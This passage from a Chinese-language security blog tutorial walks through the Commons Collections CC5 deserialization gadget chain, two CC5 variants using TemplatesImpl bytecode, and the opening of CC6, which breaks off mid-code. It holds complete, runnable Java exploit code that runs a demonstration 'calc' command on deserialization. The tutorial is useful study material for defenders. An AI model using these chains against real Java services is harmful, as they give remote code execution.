class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Ez_Java;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                        Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                        <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc5&quot;</span>));<br>            outputStream.writeObject(poc);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc5&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们可以看到前半段还是和我们的这个CC1是一样的</p>
<p>这里我们主要看到和我们CC1中不同的部分:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br></code></pre></td></tr></table></figure>

<p>前面的new了一个<code>HashMap</code>传入到<code>LazyMap</code>里面，同时也传入了<code>ChainedTransformer</code>实例化对象，<strong>当调用get方法的时候，就会调用到<code>ChainedTransformer</code>的<code>transform</code>f方法</strong>，这个没啥好说的</p>
<p><strong>这个是在CC1中,也就是说是通过我们动态代理去调用到的LazyMap的get方法的</strong></p>
<p><strong>那么CC5是换了种方式才调用到我们LazyMap的get方法里面去的</strong></p>
<p>主要的是下面的这一段代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map,<span class="hljs-number">123</span>);<br>       <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>       val.setAccessible(<span class="hljs-literal">true</span>);<br>       val.set(poc,tiedmap);<br></code></pre></td></tr></table></figure>

<p>这里我们先去看看这个TiedMapEntry的类源码:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719163948239.png" alt="image-20220719163948239"></p>
<p>该类的构造方法需要2个参数。所以我们的POC代码中，传入了一个<code>LazyMap</code>实例化对象和一个<code>123</code>的字符做占位。</p>
<p>这个时候我们去看到它的这个方法,这里的Map就是我们刚才传入的LazyMap</p>
<p><strong>(相当于这里是通过这个TiedMap再嵌套了一个Map而已)</strong></p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719164159775.png" alt="image-20220719164159775"></p>
<p>当我们调用到它的getValue这个函数的时候,那么我们也就串好了这一整条链子了</p>
<p>那么我们继续往下看:<br>我们会发现在它的toSrting方法中会调用到这两个函数</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719164421423.png" alt="image-20220719164421423"></p>
<p>那么现在我们就是需要去调用到这个TiedMap的这个toString函数了</p>
<p>现在我们去看看哪里可以调用过去:<br>我们看到这个BadAttributeValueExpException类:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719164646440.png" alt="image-20220719164646440"></p>
<p>在它的readObject函数中会先取出val属性的值赋值给valObj,然后去调用ValObj的toString()函数</p>
<p>所以现在我们只需要给这个BadAttributeValueExpException的val属性赋值为我们的这个TiedEntryMap即可</p>
<p>那么这样整个链子也就串通好了</p>
<p>这里注意我们不能直接在new的时候去赋值,因为我们看到这里:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719164838054.png" alt="image-20220719164838054"></p>
<p>这里会调用一次它的toSrting方法</p>
<p>那么整个链子也就通了</p>
<h3 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链:"></a>利用链:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException.readObject()<br>	TiedMapEntry.toString()<br>		TiedMapEntry.getValue()<br>			LazyMap.get()<br>				transformerChain.transform()<br>					ConstantTransformer.transform()<br>						.........<br>							exec<br></code></pre></td></tr></table></figure>

<p>那么整个CC5其实就是CC1的变形,让CC1触发LazyMap的get方法改变了,变成了这个通过TiedMapEntry的getValue()函数去触发了</p>
<h3 id="扩展利用链CC5k1-保留ChainedTransformer"><a href="#扩展利用链CC5k1-保留ChainedTransformer" class="headerlink" title="扩展利用链CC5k1(保留ChainedTransformer):"></a>扩展利用链CC5k1(保留ChainedTransformer):</h3><p>这里在前面CC3中我们提到有可能我们的这个invokerTransformer会被禁用,那么现在我们就结合CC3来改一下该链子:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Ez_Java;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException &#123;<br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        ClassPool classPool=ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        CtClass payload=classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections333333333&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] bytes=payload.toBytecode();<br><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;).newInstance();<br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);<br><br><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap)LazyMap.decorate(innermap,chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc5&quot;</span>));<br>            outputStream.writeObject(poc);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc5&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719191606871.png" alt="image-20220719191606871"></p>
<h3 id="扩展利用链CC5k2-不保留ChainedTransformer"><a href="#扩展利用链CC5k2-不保留ChainedTransformer" class="headerlink" title="扩展利用链CC5k2(不保留ChainedTransformer):"></a>扩展利用链CC5k2(不保留ChainedTransformer):</h3><p>在前面我们结合CC2的思想,发现这里我们的这个LazyMap.get()</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719191703977.png" alt="image-20220719191703977"></p>
<p>里面的这个key我们是可以通过TiedEntryMap去控制的</p>
<p>所以我们这样去修改:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Ez_Java;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException &#123;<br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        ClassPool classPool=ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        CtClass payload=classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections333333333&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] bytes=payload.toBytecode();<br><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;).newInstance();<br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);<br>        InstantiateTransformer instantiateTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap)LazyMap.decorate(innermap,instantiateTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map,TrAXFilter.class);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc5&quot;</span>));<br>            outputStream.writeObject(poc);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc5&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719191835862.png" alt="image-20220719191835862"></p>
<p>这个K2构造的思想和我们CC4在构造的时候去绕过数组的情况是一样的</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6:"></a>CC6:</h2><p>在CC6链中也和CC5的利用链类似，但是<strong>CC6链中使用的是<code>HashSet</code>去触发<code>LazyMap</code>的get方法</strong>。而在CC5中使用的是<code>BadAttributeValueExpException</code>。</p>
<p>这里我们直接给出我们的poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Ez_Java;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span 